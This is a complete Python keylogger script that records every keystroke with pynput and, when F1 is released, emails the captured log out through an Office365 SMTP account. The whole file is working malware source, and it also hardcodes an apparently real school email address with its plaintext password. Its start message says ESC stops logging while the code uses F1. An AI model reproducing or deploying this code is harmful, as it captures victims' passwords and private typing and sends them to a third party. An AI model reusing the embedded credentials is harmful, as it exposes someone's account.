from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from datetime import datetime

log = []

# Email Configs
EMAIL_FROM = 'l29liuy@allsaints.wa.edu.au'
EMAIL_TO = 'l29liuy@allsaints.wa.edu.au'
EMAIL_SUBJECT = 'Keylogger Log'
SMTP_SERVER = 'smtp.office365.com'
SMTP_PORT = 587
EMAIL_USER = EMAIL_FROM
EMAIL_PASS = 'ascp92la#d&g(j\'l'  # Be careful with this!

def format_key(key):
    """Format special keys for readability"""
    if hasattr(key, 'char') and key.char is not None:
        return key.char
    else:
        return f"[{key.name.upper()}]"

def send_email(body):
    """Send log via email, with error handling"""
    msg = MIMEText(body)
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    msg['Subject'] = f"{EMAIL_SUBJECT} - {timestamp}"
    msg['From'] = EMAIL_FROM
    msg['To'] = EMAIL_TO

    try:
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()
            server.login(EMAIL_USER, EMAIL_PASS)
            server.send_message(msg)
        print(f"\n📧 Email sent successfully at {timestamp}")
    except Exception as e:
        print(f"\n❌ Failed to send email: {e}")

def on_press(key):
    try:
        formatted = format_key(key)
        log.append(formatted)
        print(formatted, end='', flush=True)
    except Exception as e:
        print(f"\n⚠️ Error capturing key: {e}")

def on_release(key):
    if key == keyboard.Key.f1:  # Use F1 key instead of ESC
        print("\n\n🔷 Keylogger stopped.")
        full_log = ''.join(log)
        send_email(full_log)
        return False


def main():
    print("🔷 Keylogger started — press ESC to stop and send log via Outlook email.\n")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == '__main__':
    main()
